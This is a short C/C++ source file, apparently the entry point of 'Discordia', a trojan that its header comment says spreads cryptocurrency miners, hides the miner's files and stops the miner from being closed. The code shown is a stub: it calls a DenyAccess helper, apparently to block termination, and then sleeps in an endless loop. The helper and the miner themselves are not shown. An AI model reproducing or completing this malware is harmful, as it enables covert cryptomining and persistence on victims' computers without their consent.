/*
	# Discordia
	Discordia it's trojan for dissemination miners. Discordia written in C / C++.

	## Features
	* Hiding miner files
	* Prevents closing of miner (Windows 7 and older)
	* 

	## Author
	Alexandr Foxovsky (foxovsky.me)

*/
#include "stdafx.h"
#include "Utils.h"

using namespace std;

int main()
{
	Utils utils;
	utils.DenyAccess();

	while (true)
	{


		Sleep(300000);// 5 minutes sleep
	}

	std::cin.get();
    return 0;
}
